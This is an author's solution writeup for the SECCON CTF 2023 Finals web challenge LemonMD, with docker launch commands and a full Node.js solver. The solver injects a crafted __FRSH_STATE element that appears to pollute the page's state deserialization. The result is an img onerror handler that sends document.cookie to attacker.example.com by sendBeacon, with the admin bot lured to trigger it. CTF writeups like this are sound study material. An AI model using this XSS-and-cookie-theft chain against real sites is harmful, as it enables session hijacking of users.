---
title: "Lemonmd - SECCON CTF 2023 Finals"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "lemonmd", "web", "seccon-ctf-2023-finals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/lemonmd"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Finals"
  year: 2023
  challenge: "Lemonmd"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/lemonmd>
- **CTF:** SECCON CTF 2023 Finals

---

# [web] LemonMD

## Description

🍋📝✨

- Challenge: `http://lemonmd.{int,dom}.seccon.games:3000`
- Admin bot: `http://lemonmd.{int,dom}.seccon.games:1337`

## Attachments

- [lemonmd](files/lemonmd)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it --rm \
    -e WEB_BASE_URL=http://localhost:3000 \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e ATTACKER_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/lemonmd/solver/index.js>

```javascript
const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const WEB_BASE_URL = process.env.WEB_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  const text = `<h1 id="__FRSH_STATE">${JSON.stringify({
    v: {
      0: [
        {
          text: {
            _f: "s",
            v: `&lt;img src=0 onerror="navigator.sendBeacon('${ATTACKER_BASE_URL}', document.cookie)"&gt;`,
          },
        },
      ],
      "*": ["onerror"],
    },
    r: [[["*"], ["constructor", "prototype", "*"]]],
  })}</h1>`;

  const body = new FormData();
  body.set("text", text);

  const res = await fetch(`${WEB_BASE_URL}/save`, {
    method: "POST",
    body,
  });

  const targetUrl = `http://web:3000${new URL(res.url).pathname}`;
  console.log({ targetUrl });

  fastify.post("/", async (req, reply) => {
    // You got a flag!
    console.log(req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    await reportUrl(targetUrl);

    fail("Failed");
  });
};
start();
```
